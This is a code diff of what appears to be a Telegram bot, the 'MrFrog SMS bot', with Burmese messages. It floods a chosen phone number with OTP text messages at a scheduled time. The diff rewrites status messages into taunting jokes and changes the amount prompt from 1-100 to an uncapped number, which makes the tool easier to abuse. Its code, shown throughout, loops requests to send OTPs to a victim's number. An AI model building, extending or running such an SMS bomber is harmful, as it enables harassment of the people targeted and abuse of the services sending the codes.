@@ -75,9 +75,9 @@ def flood_sms(phone, amount, chat_id):
             with urllib.request.urlopen(req, timeout=10) as response:
                 if response.status == 200:
                     success_count += 1
-                    send_message(chat_id, f"[{i+1}] OTP တစ်ခု ပို့ပြီးပါပြီ ✅")
+                    send_message(chat_id, f"[{i+1}] OTP ,ဒီတစ်ခုရောက်သွားပေမဲ့မင်းဆီသူမပြန်ရောက်မလာပါဘူး✅")
         except:
-            send_message(chat_id, f"[{i+1}] ပို့ဆောင်မှု လွဲချော်နေပါတယ် ❌")
+            send_message(chat_id, f"[{i+1}] သူမမင်းဆီပြန်မလာပါဘူး❌")
         time.sleep(1)
     return success_count
 
@@ -89,9 +89,9 @@ def scheduled_task(phone, amount, target_time, chat_id):
         if current_mm_time == target_time:
             break
         time.sleep(30)
-    send_message(chat_id, "[🚀] အချိန်ကျပြီ! OTP တွေ စတင်ပို့လွှတ်နေပါပြီ...")
+    send_message(chat_id, "[🚀] ကျောင်းပြန်ဖွင့်ရန်နှစ်ပတ်သာလိုတော့သည်")
     success = flood_sms(phone, amount, chat_id)
-    send_message(chat_id, f"[✔] ပြီးပြီ! အောင်မြင်မှု: {success}/{amount}\nနောက်ထပ် /start ပြန်နှိပ်ပါ။")
+    send_message(chat_id, f"[✔] ပြီးပြီ!ဟောင့်: {success}/{amount}\nနောက်ထပ်တိုက်ချင်ရင် /start ပြန်နှိပ်😑🫪။")
 
 def handle_update(update):
     if "message" not in update or "text" not in update["message"]: return
@@ -100,7 +100,7 @@ def handle_update(update):
     
     if text == "/start":
         USER_STATES[chat_id] = {"state": PHONE}
-        send_message(chat_id, "မင်္ဂလာပါ! ဖုန်းနံပါတ်ထည့်ပါ:")
+        send_message(chat_id, "မင်္ဂလာပါခင်ဗျ🫪 MrFrog SMS botမှကြိုဆိုပါတယ် 🤪ပို့ချင်သောဖုန်းနာမ်ပါတ်ထည့်ပါ (ဥပမာ - 09၅၉8ကြွတ်ကြွတ်အိတ်):")
         return
 
     if chat_id not in USER_STATES: return
@@ -109,13 +109,13 @@ def handle_update(update):
     if state["state"] == PHONE:
         state["phone"] = text
         state["state"] = AMOUNT
-        send_message(chat_id, "ပမာဏ (1-100) ထည့်ပါ:")
+        send_message(chat_id, " (1-ကြိုက်သလောက်ထည့်) ")
     elif state["state"] == AMOUNT:
         state["amount"] = int(text)
         state["state"] = TIME_STATE
-        # ယခုအချိန်ကို ပြပေးခြင်း
+        
         current_mm_time = (datetime.utcnow() + timedelta(hours=6, minutes=30)).strftime("%H:%M")
-        send_message(chat_id, f"[⏰] ယခုအချိန်: {current_mm_time}\nပို့ရမယ့်အချိန်ထည့်ပါ (ဥပမာ 23:00):")
+        send_message(chat_id, f"[⏰] ယခုအချိန်: {current_mm_time}\nပို့ရမယ့်အချိန် (မင်းဥမပါ🫪 23:00):")
     elif state["state"] == TIME_STATE:
         target_time = text
         phone, amount = state["phone"], state["amount"]
